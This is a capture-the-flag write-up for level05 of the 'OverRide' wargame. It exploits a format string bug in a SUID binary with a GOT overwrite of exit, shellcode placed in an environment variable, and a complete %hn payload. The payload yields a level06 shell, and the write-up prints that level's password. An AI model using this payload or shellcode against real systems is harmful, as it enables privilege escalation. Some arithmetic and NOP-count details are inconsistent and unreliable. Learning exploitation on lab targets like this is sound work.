# Level05 Exploit

## 1. Initial Analysis

List the files in the directory:

```bash
level05@OverRide:~$ ls -l
total 8
-rwsr-s---+ 1 level06 users 5176 Sep 10  2016 level05
```

The `level05` binary has the SUID bit set, which means it will run with the permissions of the owner of the file, in this case `level06`.

## 2. Program Execution

Observe the program behavior:

```bash
level05@OverRide:~$ ./level05 
test
test
level05@OverRide:~$ ./level05 
aaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaa
```

We can see that the program waits for an input, and then prints the input.

## 3. Disassembling `main` Function

Use GDB to disassemble the `main` function:

```bash
level05@OverRide:~$ gdb level05
(gdb) disass main
```

You can convert the assembly code to C using the [CodeConvert](https://www.codeconvert.ai/assembly-to-c++-converter) tool. You can find the converted code in [source.c](source.c).

## 4. Program Analysis

In the `main` function, we can see that the program reads the standard input into a buffer.
After that, in the `while` loop, the program checks if the character is less than or equal to `0x40` (64 in decimal) or greater than `0x5A` (90 in decimal). If it is, the program breaks out of the loop.
In the ASCII table, the characters from `0x41` to `0x5A` are the uppercase letters.
The program converts the uppercase letters to lowercase by XORing the character with `0x20`.
```c
while (index < 40) {
    char ch = buffer[index];
    if (ch <= 0x40) {
        break;
    }
    if (ch > 0x5A) {
        break;
    }
    buffer[index] ^= 0x20;
    index++;
}
```
Then, the program prints the buffer.
This `printf` function is vulnerable to a format string attack.
Indeed, we can use format string specifiers to read or write memory.

### 4.1. Format String Vulnerability

In the `printf` function, the `%n` format string specifier writes the number of characters written so far to the variable.
Example:
```c
int n = 0;
printf("Hello %n", &n);
printf("%d\n", n); // Output: 6
```

The `%hn` format string specifier writes the number of characters written so far to the variable, but it writes only 2 bytes.
Example:
```c
short n = 0;
printf("Hello %hn", &n);
printf("%d\n", n); // Output: 6
```
The `%10$hn` format string specifier writes the number of characters written so far to the 10th argument.

## 5. Exploitation

In the program, after `printf(buffer)`, there is `exit(0)`.
We will try to overwrite the `exit` function pointer with the address of a shellcode.

### 5.1. Find the Offset

We will use the `%x` format string specifier to print the stack content, and find where the first argument is located.

```bash
level05@OverRide:~$ ./level05 
AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
aaaa 64 f7fcfac0 f7ec3af9 ffffd66f ffffd66e 0 ffffffff ffffd6f4 f7fdb000 61616161 20782520 25207825 78252078 20782520 25207825
```
We can see that the first argument is located at the 11th position.

### 5.2. Find the Address of the `exit` Function

```bash
level05@OverRide:~$ objdump -R level05

level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit
080497e4 R_386_JUMP_SLOT   __libc_start_main
```
The address of the `exit` is contained in the `R_386_JUMP_SLOT` section at address `0x080497e0`.

### 5.3. Declare the Shellcode

Our shellcode: `\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`.
We will export the shellcode to an environment variable.

```bash
export SHELLCODE=`python -c 'print "\x90" * 128 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`
```
We add 100 NOPs before the shellcode to ensure that the shellcode is executed.

Now, we will search for the address of the environment variable.

```bash
level05@OverRide:~$ gdb ./level05 
(gdb) break main
Breakpoint 1 at 0x8048449
(gdb) run
Starting program: /home/users/level05/level05 

Breakpoint 1, 0x08048449 in main ()
(gdb) x/s *((char **)environ)
0xffffd855:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311̀"
```
The command `x/s *((char **)environ)` prints the environment variables.
`x` is used to examine memory, and `s` is used to print in string format.
`*((char **)environ)` is used to get the address of the environment variables.

The address of our `SHELLCODE` environment variable is `0xffffd855`.

### 5.4. Exploit

We will write the adress of the `SHELLCODE` environment variable to the adresse which contains the `exit` address.
We know that the address which contains the `exit` address is `0x080497e0`.
So in little endian, it is `\xe0\x97\x04\x08`.
If we write this address in the printf, we can see that the address is write in the 10th argument.
```bash
level05@OverRide:~$ python -c 'print "\xe0\x97\x04\x08 %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x"' | ./level05
� 64 f7fcfac0 f7ec3af9 ffffd66f ffffd66e 0 ffffffff ffffd6f4 f7fdb000 80497e0 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520
```

Now, we will use the `%hn` format string specifier to write the address of the `SHELLCODE` environment variable.
We will write first the 2 high bytes, then the 2 low bytes.

We can't just use `%n` to write the address of the `SHELLCODE` environment variable, because `0xffffd855` in decimal is `4294957141`, which is too big to write in one shot. It doesn't work.

SHELLCODE address = `0xffffd855`
In little-endian, the low bytes are stored first, then the high bytes.
So we want to write `0xffff` in `0x080497e2` and `0xd855` in `0x080497e0`.

`0xd855` = 55413 in decimal, so we will write `55413 - 8 = 55405` to write `0xd871`, - 8 bytes for the address of the pointer to the `exit` function.
So we will write `%55405%10$hn` (`%55405x` to write 55405 characters in hexadecimal, and `%10$hn` to write the number of characters written so far to the 10th argument).

`0xffff` = 65535 in decimal, so we will write `65535 - (55405 + 8) = 10122` to write `0xffff`.
`%10122%11$hn` (`%10122x` to write 10122 characters in hexadecimal, and `%11$hn` to write the number of characters written so far to the 11th argument).

Payload total: `\xe0\x97\x04\x08` + `\xe2\x97\x04\x08` + `%55405x%10$hn%10122x%11$hn`.
```bash
python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55405x%10$hn%10122x%11$hn"' > /tmp/test
(cat /tmp/test; cat) | ./level05
```

We are now in a shell with the permissions of `level06`.
```bash
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

Congratulations! You have successfully exploited the `level05` binary and found the password for `level06`.

```bash
level05@OverRide:~$ su level06
Password: 
```
